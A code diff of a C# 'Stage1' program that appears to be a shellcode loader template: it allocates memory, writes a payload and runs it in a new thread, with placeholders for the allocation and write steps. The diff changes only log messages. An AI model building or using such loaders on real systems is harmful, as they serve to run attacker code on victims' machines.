@@ -14,28 +14,25 @@ namespace Stage1
             IntPtr hCurrentProcess = PInvokes.GetCurrentProcess();
 
 
-            Console.WriteLine("Allocating memory...");
+            Console.WriteLine("[>] Allocating memory...");
             [SHAPESHIFTER_MEMALLOC]
 
-            Console.WriteLine("Writing to the buffer (0x{0:X} bytes)", payload.Length);
+            Console.WriteLine("[>] Writing to the buffer (0x{0:X} bytes)...", payload.Length);
             [SHAPESHIFTER_WRITEVM]
 
-            Console.WriteLine("Creating thread...");
+            Console.WriteLine("[>] Creating thread...");
             uint threadID = 0;
             IntPtr hThread = PInvokes.CreateThread(0, 0, (uint)pMemoryAllocation, IntPtr.Zero, 0, ref threadID);
             if (hThread == IntPtr.Zero)
             {
                 return;
             }
-            else
-            {
-                Console.WriteLine("[+] Thread ID: 0x{0:X}", threadID);
-            }
 
-            Console.WriteLine("Waiting for the thread to start...");
+
+            Console.WriteLine("[>] Waiting for the thread to start...");
             PInvokes.WaitForSingleObject(hThread, 0xFFFFFFFF);
 
-            Console.WriteLine("Operation complete");
+            Console.WriteLine("[+] Operation complete");
             return;
         }
     }
